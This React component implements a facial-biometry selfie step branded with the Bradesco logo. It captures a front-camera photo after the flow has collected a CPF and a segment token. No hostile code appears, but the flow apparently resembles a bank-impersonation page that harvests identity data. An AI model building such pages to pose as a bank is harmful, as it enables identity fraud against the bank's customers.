import { useState, useEffect, useRef, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import { useFlow } from "@/contexts/FlowContext";
import { ArrowLeft, Camera, RefreshCw } from "lucide-react";
import LottieBackground from "@/components/LottieBackground";
import { getSegmentLogo } from "@/lib/segment-config";
import { segmentButtonStyle } from "@/lib/segment-colors";
import { useFlowNavigation } from "@/hooks/useFlowNavigation";

const BiometryPage = () => {
  const navigate = useNavigate();
  const { data } = useFlow();
  const { getNextStep, getPrevStep } = useFlowNavigation();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [photo, setPhoto] = useState<string | null>(null);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const [error, setError] = useState("");
  const logo = getSegmentLogo(data.segment);

  useEffect(() => {
    if (!data.cpf || !data.segment || !data.segToken) navigate("/");
  }, [data.cpf, data.segment, data.segToken, navigate]);

  const startCamera = useCallback(async () => {
    try {
      setError("");
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: 480, height: 640 },
      });
      streamRef.current = mediaStream;
      setStream(mediaStream);
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
      }
    } catch {
      setError("Não foi possível acessar a câmera. Verifique as permissões.");
    }
  }, []);

  useEffect(() => {
    startCamera();
    return () => {
      streamRef.current?.getTracks().forEach((t) => t.stop());
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const capture = () => {
    if (!videoRef.current || !canvasRef.current) return;
    const canvas = canvasRef.current;
    canvas.width = videoRef.current.videoWidth;
    canvas.height = videoRef.current.videoHeight;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;
    ctx.drawImage(videoRef.current, 0, 0);
    setPhoto(canvas.toDataURL("image/jpeg", 0.8));
    stream?.getTracks().forEach((t) => t.stop());
  };

  const retake = () => {
    setPhoto(null);
    startCamera();
  };

  const handleSubmit = () => {
    if (!photo) {
      setError("Tire uma selfie para continuar");
      return;
    }
    navigate(getNextStep("biometria"));
  };

  return (
    <div className="relative flex min-h-screen flex-col px-6 py-8 pb-safe">
      <LottieBackground segment={data.segment} />

      {/* Header */}
      <div className="relative z-10 flex items-center justify-between mb-4">
        <img src={logo} alt="Bradesco" className="w-[120px] h-auto object-contain brightness-0 invert" />
        <button
          onClick={() => navigate(getPrevStep("biometria"))}
          className="flex items-center gap-1 text-body-sm text-white/60"
        >
          <ArrowLeft className="h-4 w-4" /> Voltar
        </button>
      </div>

      {/* Heading */}
      <h1 className="relative z-10 text-lg font-bold leading-snug text-white mb-0">
        Biometria Facial
      </h1>
      <p className="relative z-10 text-body-sm text-white/60 mt-1">
        Posicione seu rosto no centro e tire uma selfie
      </p>

      {/* Spacer */}
      <div className="flex-1 min-h-[40px] max-h-[80px]" />

      {/* Camera */}
      <div className="relative z-10 mb-8">
        <div className="relative aspect-[3/4] w-full max-w-xs mx-auto overflow-hidden rounded-2xl bg-black/30">
          {!photo ? (
            <>
              <video
                ref={videoRef}
                autoPlay
                playsInline
                muted
                className="h-full w-full object-cover"
              />
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="h-56 w-44 rounded-full border-4 border-dashed border-white/50" />
              </div>
            </>
          ) : (
            <img
              src={photo}
              alt="Selfie capturada"
              className="h-full w-full object-cover"
            />
          )}
        </div>
        {error && <p className="text-xs text-yellow-200 text-center mt-2">{error}</p>}
        <canvas ref={canvasRef} className="hidden" />
      </div>

      {/* Spacer */}
      <div className="flex-1" />

      {/* Button */}
      {!photo ? (
        <button
          style={segmentButtonStyle(data.segment)}
          className="relative z-10 flex h-14 w-full items-center justify-center gap-2 rounded-full text-body font-semibold shadow-lg transition-all active:scale-[0.98]"
          onClick={capture}
        >
          <Camera className="h-5 w-5" /> Tirar Selfie
        </button>
      ) : (
        <div className="relative z-10 flex w-full gap-3">
          <button
            className="flex h-14 flex-1 items-center justify-center gap-2 rounded-full border-2 border-white/30 text-body font-semibold text-white transition-all active:scale-[0.98]"
            onClick={retake}
          >
            <RefreshCw className="h-4 w-4" /> Nova Foto
          </button>
          <button
            style={segmentButtonStyle(data.segment)}
            className="h-14 flex-1 rounded-full text-body font-semibold shadow-lg transition-all active:scale-[0.98]"
            onClick={handleSubmit}
          >
            Enviar
          </button>
        </div>
      )}
    </div>
  );
};

export default BiometryPage;
